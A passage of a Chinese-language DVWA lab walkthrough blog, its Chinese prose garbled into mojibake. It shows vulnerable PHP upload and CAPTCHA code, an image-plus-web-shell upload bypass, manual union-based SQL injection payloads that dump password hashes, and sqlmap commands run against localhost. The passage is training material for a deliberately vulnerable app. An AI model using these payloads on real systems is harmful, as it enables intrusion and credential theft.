class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å¯¹æ–‡ä»¶ä¸Šä¼ çš„ç±»å‹åšäº†é™åˆ¶ï¼Œè¦æ±‚å¿…é¡»æ˜¯image&#x2F;jpeg æˆ–è€… image&#x2F;png ç±»å‹çš„ã€‚</p>
<p>æŠ“åŒ…æ”¹content-type</p>
<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpg&quot;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpeg&quot;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;png&quot;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>å‡½æ•°ä¼šé€šè¿‡è¯»å–æ–‡ä»¶å¤´ï¼Œè¿”å›å›¾ç‰‡çš„é•¿ã€å®½ç­‰ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰ç›¸å…³çš„å›¾ç‰‡æ–‡ä»¶å¤´ï¼Œå‡½æ•°ä¼šæŠ¥é”™ã€‚<br>å¯ä»¥çœ‹åˆ°ï¼ŒHighçº§åˆ«çš„ä»£ç è¯»å–æ–‡ä»¶åä¸­æœ€åä¸€ä¸ªâ€.â€åçš„å­—ç¬¦ä¸²ï¼ŒæœŸæœ›é€šè¿‡æ–‡ä»¶åæ¥é™åˆ¶æ–‡ä»¶ç±»å‹ï¼Œå› æ­¤è¦æ±‚ä¸Šä¼ æ–‡ä»¶åå½¢å¼å¿…é¡»æ˜¯â€*.jpgâ€ã€â€*.jpegâ€ ã€â€*.pngâ€ä¹‹ä¸€ã€‚åŒæ—¶ï¼Œgetimagesizeå‡½æ•°æ›´æ˜¯é™åˆ¶äº†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å¤´å¿…é¡»ä¸ºå›¾åƒç±»å‹ã€‚</p>
<p>æ€»çš„æ¥è¯´å°±æ˜¯å¯¹æ–‡ä»¶å¤´å’Œæ–‡ä»¶åå½¢å¼è¿›è¡Œäº†æ£€æŸ¥ï¼Œéœ€è¦ä½¿ç”¨å›¾ç‰‡é©¬ï¼Œè¿›è¡Œç»•è¿‡</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy 1.png/b + 2.php/a 3.png<br></code></pre></td></tr></table></figure>

<p>1.png:æ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„å›¾ç‰‡</p>
<p>2.php:å†™ä¸€å¥è¯æœ¨é©¬</p>
<p>3.png:ä¸Šä¼ çš„æ–‡ä»¶</p>
<h2 id="éªŒè¯ç "><a href="#éªŒè¯ç " class="headerlink" title="éªŒè¯ç "></a>éªŒè¯ç </h2><p>é€»è¾‘æ¼æ´</p>
<h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><p>ç›´æ¥æŠ“åŒ…è·³è¿‡step1ï¼Œå¯ä»¥ä½¿ç”¨csrfæ„é€ ä¸€ä¸ªè¯±å¯¼é¡µé¢</p>
<h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><p>æºç ä¸­å¢åŠ äº†ä¸€ä¸ªpassed_captï¼Œå½“passed_captä¸ºtrueæ—¶å°±å¯ä»¥ä¿®æ”¹å¯†ç äº†</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127193015167.png" srcset="/img/loading.gif" lazyload alt="image-20240127193015167"></p>
<p>æŠ“åŒ…åï¼Œä¿®æ”¹step2ï¼Œåœ¨åé¢å¢åŠ &amp;passed_captcha&#x3D;true</p>
<h3 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check CAPTCHA from 3rd party</span><br>    <span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">recaptcha_check_answer</span>(<br>        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;recaptcha_private_key&#x27;</span> ],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span>]<br>    );<br><br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-variable">$resp</span> || <br>        (<br>            <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="hljs-string">&#x27;hidd3n_valu3&#x27;</span><br>            &amp;&amp; <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="hljs-string">&#x27;reCAPTCHA&#x27;</span><br>        )<br>    )&#123;<br>        <span class="hljs-comment">// CAPTCHA was correct. Do both new passwords match?</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span>) &#123;<br>            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>            <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>            <span class="hljs-comment">// Update database</span><br>            <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">&quot;&#x27; LIMIT 1;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>            <span class="hljs-comment">// Feedback for user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Ops. Password mismatch</span><br>            <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;<br>            <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// What happens when the CAPTCHA was entered incorrectly</span><br>        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>ä¿®æ”¹å‚æ•° $_POST[ â€˜g-recaptcha-responseâ€™ ] &#x3D;&#x3D; â€˜hidd3n_valu3â€™  <em>$_SERVER[ â€˜HTTP_USER_AGENTâ€™ &#x3D;&#x3D; â€˜reCAPTCHAâ€™</em></p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127194623823.png" srcset="/img/loading.gif" lazyload alt="image-20240127194623823"></p>
<h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>sqlæ˜¯æ“ä½œæ•°æ®åº“æ•°æ®çš„ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼Œç½‘é¡µçš„åº”ç”¨æ•°æ®å’Œåå°æ•°æ®åº“ä¸­çš„æ•°æ®è¿›è¡Œäº¤äº’æ—¶ä¼šé‡‡ç”¨SQLã€‚è€ŒSQLæ³¨å…¥æ˜¯å°†Webé¡µé¢çš„åŸURLã€è¡¨å•åŸŸæˆ–æ•°æ®åŒ…è¾“å…¥çš„å‚æ•°ï¼Œä¿®æ”¹æ‹¼æ¥æˆSQLè¯­å¥ï¼Œä¼ é€’ç»™WebæœåŠ¡å™¨ï¼Œè¿›è€Œä¼ ç»™æ•°æ®åº“æœåŠ¡å™¨ä»¥æ‰§è¡Œæ•°æ®åº“å‘½ä»¤ã€‚å¦‚Webåº”ç”¨ç¨‹åºçš„å¼€å‘äººå‘˜å¯¹ç”¨æˆ·æ‰€è¾“å…¥çš„æ•°æ®æˆ–cookieç­‰å†…å®¹ä¸è¿›è¡Œè¿‡æ»¤æˆ–éªŒè¯(å³å­˜åœ¨æ³¨å…¥ç‚¹)å°±ç›´æ¥ä¼ è¾“ç»™æ•°æ®åº“ï¼Œå°±å¯èƒ½å¯¼è‡´æ‹¼æ¥çš„SQLè¢«æ‰§è¡Œï¼Œè·å–å¯¹æ•°æ®åº“çš„ä¿¡æ¯ä»¥åŠææƒï¼Œå‘ç”ŸSQLæ³¨å…¥æ”»å‡»ã€‚</p>
<h3 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h3><p>é¦–å…ˆè¾“å…¥1 æˆ–è€… 2 èƒ½æŸ¥å‡ºæŒ‡å®šä¿¡æ¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> ); <br></code></pre></td></tr></table></figure>

<p>æ¥ç€è¾“å…¥1â€™ and 1&#x3D;1ï¼ŒæŠ¥è¯¯</p>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near â€˜â€™â€™ at line 1</p>
<p>è¯´æ˜å—åˆ°å•å¼•å·é—­åˆå½±å“</p>
<p>æ¥æŠŠSQLè¯­å¥ä¸­åç»­è¯­å¥å…¨éƒ¨æ³¨é‡Šæ‰ä¸æ‰§è¡Œï¼Œåœ¨åˆ¤æ–­è¯­å¥ååŠ #æˆ–è€…â€“+å³å¯ï¼Œå…¨éƒ¨æ³¨é‡Šæ‰å°±å¯ä»¥ä¸ç”¨è€ƒè™‘å•åŒå¼•å·é—­åˆçš„é—®é¢˜</p>
<p>1â€™ or 1&#x3D;1#å¯ä»¥æŸ¥å‡ºæ‰€æœ‰IDå†…å®¹</p>
<p>é€»è¾‘è§£é‡Šï¼šä¸ºäº†å°è¯•æ³¨å…¥ä¸€ä¸ªå§‹ç»ˆä¸ºçœŸçš„æ¡ä»¶ï¼Œä»è€Œç»•è¿‡æŸäº›åŸºäºæ¡ä»¶çš„éªŒè¯æˆ–è¿‡æ»¤ï¼Œå¯¼è‡´æ‰€æœ‰è®°å½•éƒ½è¢«è¿”å›</p>
<ul>
<li><code>1â€™</code>ï¼šè¿™éƒ¨åˆ†è¡¨ç¤ºæ•°å­—1åé¢è·Ÿç€ä¸€ä¸ªå•å¼•å·ã€‚åœ¨SQLæ³¨å…¥çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè¿™é€šå¸¸ç”¨äºå°è¯•å…³é—­å‰é¢çš„å­—ç¬¦ä¸²æˆ–æ³¨é‡Šæ‰åç»­çš„SQLä»£ç ã€‚</li>
<li><code>or</code>ï¼šé€»è¾‘æˆ–æ“ä½œç¬¦ï¼Œç”¨äºè¿æ¥ä¸¤ä¸ªæ¡ä»¶ã€‚</li>
<li><code>1=1</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæ°¸è¿œä¸ºçœŸçš„æ¡ä»¶ï¼Œå› ä¸º1ç¡®å®ç­‰äº1ã€‚</li>
<li><code>#</code>ï¼šåœ¨SQLä¸­ï¼Œäº•å·ï¼ˆ#ï¼‰ç”¨äºæ³¨é‡Šæ‰åé¢çš„å†…å®¹ã€‚è¿™æ„å‘³ç€ä»»ä½•å‡ºç°åœ¨<code>#</code>ä¹‹åçš„SQLä»£ç éƒ½å°†è¢«å¿½ç•¥ã€‚</li>
</ul>
<p><strong>æŸ¥å­—æ®µ</strong></p>
<p>1â€™ and 1&#x3D;1 order by 2#</p>
<p>1â€™ and 1&#x3D;1 order by 3#</p>
<p>å¦‚æœ2æ˜¯æ­£ç¡®çš„çš„ï¼Œ3è¿”å›é”™è¯¯é‚£ä¹ˆå°±æœ‰2ä¸ªå­—æ®µï¼Œ2å³ä¸ºåˆ†ç•Œç‚¹</p>
<p><strong>æ˜¾ç¤ºæŠ¥é”™ä½</strong></p>
<p>1â€™ union select 1,2#</p>
<p><code>1â€™</code>ï¼šè¿™è¯•å›¾å…³é—­åŸå§‹æŸ¥è¯¢ä¸­çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåŸå§‹æŸ¥è¯¢æ˜¯ <code>SELECT * FROM users WHERE username = &#39;admin&#39;</code>ï¼Œé‚£ä¹ˆ <code>1â€™</code> ä¼šå°è¯•å°†å…¶å˜ä¸º <code>SELECT * FROM users WHERE username = &#39;admin&#39;1â€™</code>ã€‚</p>
<p><strong>æŸ¥æ•°æ®åº“å</strong></p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>

<p><strong>æŸ¥è¡¨å</strong></p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() #<br></code></pre></td></tr></table></figure>

<p><strong>æŸ¥åˆ—å</strong></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=database() <span class="hljs-keyword">and</span> table_name=users <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>

<p><strong>æŸ¥å…·ä½“ä¿¡æ¯</strong></p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; union <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>),group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users #<br></code></pre></td></tr></table></figure>

<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240129215859751.png" srcset="/img/loading.gif" lazyload alt="image-20240129215859751"></p>
<p>md5è§£ç å°±è¡Œ</p>
<h3 id="medium-5"><a href="#medium-5" class="headerlink" title="medium"></a>medium</h3><p>ä¼ å‚æ–¹æ³•æ”¹æˆpostï¼Œä½¿ç”¨äº†è½¬ä¹‰</p>
<h2 id="sqlmapä½¿ç”¨"><a href="#sqlmapä½¿ç”¨" class="headerlink" title="sqlmapä½¿ç”¨"></a>sqlmapä½¿ç”¨</h2><h3 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h3><p>sqlmap -u â€œ  â€œæ—¶å‡ºç°äº†302é‡å®šå‘ä¼šè¿”å›ç™»å½•é¡µé¢ï¼Œè¯æ˜è¿™ä¸ªé¡µé¢éœ€è¦cookieï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±å¤åˆ¶æ•°æ®åŒ…ä¸­çš„cookie</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131162219429.png" srcset="/img/loading.gif" lazyload alt="image-20240131162219429"></p>
<p>æŸ¥çœ‹æ³¨å…¥ç‚¹ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u <span class="hljs-string">&quot;http://localhost:777/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=5a846udquqghotgkl5usm8b7d9; security=low&quot;</span> --batch(é»˜è®¤å›ç­”)<br></code></pre></td></tr></table></figure>

<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131162728647.png" srcset="/img/loading.gif" lazyload alt="image-20240131162728647"></p>
<p>æŸ¥çœ‹æ•°æ®åº“ç›¸å…³ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u <span class="hljs-string">&quot;http://localhost:777/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=5a846udquqghotgkl5usm8b7d9; security=low&quot;</span> --batch --dbs<br></code></pre></td></tr></table></figure>

<p>ç»§ç»­æ·»åŠ â€“current-dbå³å¯æŸ¥çœ‹è¯¥æ•°æ®åº“åç§°</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131162810529.png" srcset="/img/loading.gif" lazyload alt="image-20240131162810529"></p>
<p>ç»§ç»­æ·»åŠ å‘½ä»¤ -D dvwa â€“tables(åˆ—å‡ºdvwaæ•°æ®åº“ä¸­å…¨éƒ¨è¡¨å)</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131163145773.png" srcset="/img/loading.gif" lazyload alt="image-20240131163145773"></p>
<p>ä¿®æ”¹å‘½ä»¤-D dvwa -T users â€“columnsï¼ˆåˆ—å‡ºuserè¡¨ä¸­å­—æ®µä¿¡æ¯ï¼‰</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131163312778.png" srcset="/img/loading.gif" lazyload alt="image-20240131163312778"></p>
<p>ä¿®æ”¹å‘½ä»¤-D dvwa -T users -C user,password,user_id â€“dumpï¼ˆä¸€èˆ¬æ•°æ®åº“ä¸­çš„ä¿¡æ¯éƒ½ä¼šåŠ å¯†ï¼Œè¿™ä¸ªå‘½ä»¤å¯ä»¥ç›´æ¥æ˜¾ç¤ºè§£å¯†åçš„æƒ…å†µï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨ä¿å­˜åˆ°æœ¬åœ°ï¼‰</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131163518649.png" srcset="/img/loading.gif" lazyload alt="image-20240131163518649"></p>
<h3 id="medium-6"><a href="#medium-6" class="headerlink" title="medium"></a>medium</h3><p>postä¼ å‚</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131164158541.png" srcset="/img/loading.gif" lazyload alt="image-20240131164158541"></p>
